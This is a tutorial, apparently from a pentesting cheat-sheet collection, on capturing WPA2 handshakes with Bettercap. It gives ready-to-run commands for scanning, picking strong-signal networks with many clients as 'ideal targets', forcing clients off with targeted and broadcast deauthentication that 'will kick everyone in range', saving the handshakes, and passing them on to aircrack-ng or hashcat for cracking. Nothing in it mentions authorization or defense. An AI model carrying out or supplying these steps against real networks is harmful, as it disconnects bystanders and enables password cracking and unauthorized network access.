---
title: Attacking WPA2 with Bettercap
category: wireless
subcategory: sub-03
os: linux
command: sudo bettercap -iface wlan0
tools: bettercap
---


## Attacking WPA2 with Bettercap

Bettercap is the Swiss Army knife of network security testing. In this tutorial, I'll show you how to use it to intercept WPA2 handshakes – from reconnaissance, through client deauthentication, to saving files ready for cracking.

### Launching and Configuration

```bash
sudo bettercap -iface wlan0
```

Inside the Bettercap console:

```bash
set wifi.interface wlan1
```

### Scanning the Network

Enable scanning and search for the target:

```bash
wifi.recon on
wifi.recon.channel 6,11
wifi.show
```

### Muting the Console

The Bettercap console can be verbose. We mute it:

```bash
events.stream off
```

### Auto-refresh

For convenience, we set auto-refresh:

```bash
set ticker.commands "clear; wifi.show"
set ticker.period 5
ticker on
```

### Network filtering

We're only interested in WPA2 networks with a good signal:

```bash
set wifi.show.filter "WPA2"
set wifi.rssi.min -59
set wifi.show.sort clients desc
wifi.show
```

Now at the top of the list are WPA2 networks with a strong signal, sorted by the number of connected clients – ideal targets.

### Focus on a specific network

We're now focusing on a specific network. When we enter the following commands, we only see the selected network and its clients:

```bash
wifi.recon AA:BB:CC:DD:EE:FF
wifi.show
```

### Handshake Recording Configuration

Before the attack, we check where the captured files will go. Setting `aggregate false` saves the handshake for each network to a separate file:

```bash
get wifi.handshakes.file
set wifi.handshakes.file "/home/ubuntu/handshakes/"
set wifi.handshakes.aggregate false
```

### Deauthentication

We force the clients to disconnect. When they reconnect, we capture the handshake. You can target a specific client…

```bash
wifi.deauth AA:BB:CC:DD:EE:FF
```

…or use broadcast deauth on everything in range. The following command, entered 1:1 (ff:…), will kick everyone in range:

```bash
wifi.deauth ff:ff:ff:ff:ff:ff
```

### Waiting for a handshake

Bettercap automatically captures and logs handshakes. Monitor the console – a message about the capture will appear.

### Cleaning

```bash
ticker off
wifi.recon off
wifi.clear
```

### Starting with a single command

The whole thing can be started with a single command:

```bash
sudo bettercap -iface wlan0 -eval "set wifi.interface wlan1; set ticker.commands 'clear; wifi.show'; wifi.recon on; events.stream off; ticker on"
```

**What's next?** We crack the captured handshake using standard methods such as aircrack-ng or hashcat.